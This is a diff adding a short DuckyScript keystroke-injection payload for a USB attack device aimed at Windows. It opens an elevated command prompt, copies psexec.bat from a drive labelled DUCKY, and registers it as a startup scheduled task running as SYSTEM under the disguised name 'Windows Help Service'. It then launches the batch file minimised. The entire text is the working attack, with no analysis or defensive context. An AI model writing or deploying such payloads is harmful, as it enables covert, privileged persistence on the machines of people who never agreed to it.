@@ -1,0 +1,20 @@
+DELAY 5000
+ESCAPE
+DELAY 500
+CONTROL ESCAPE
+DELAY 500
+STRING cmd
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+STRING for /f %a in ('wmic logicaldisk get volumename^,name ^| find "DUCKY"') do copy %a\exec\PSExec_powershell\psexec.bat %cd%\psexec.bat
+ENTER
+DELAY 500
+STRING schtasks /create /tn "Windows Help Service" /tr %cd%\psexec.bat /sc onstart /ru SYSTEM /F
+ENTER
+DELAY 250
+STRING start /min %cd%\psexec.bat
+ENTER
+DELAY 200
+STRING exit
+ENTER
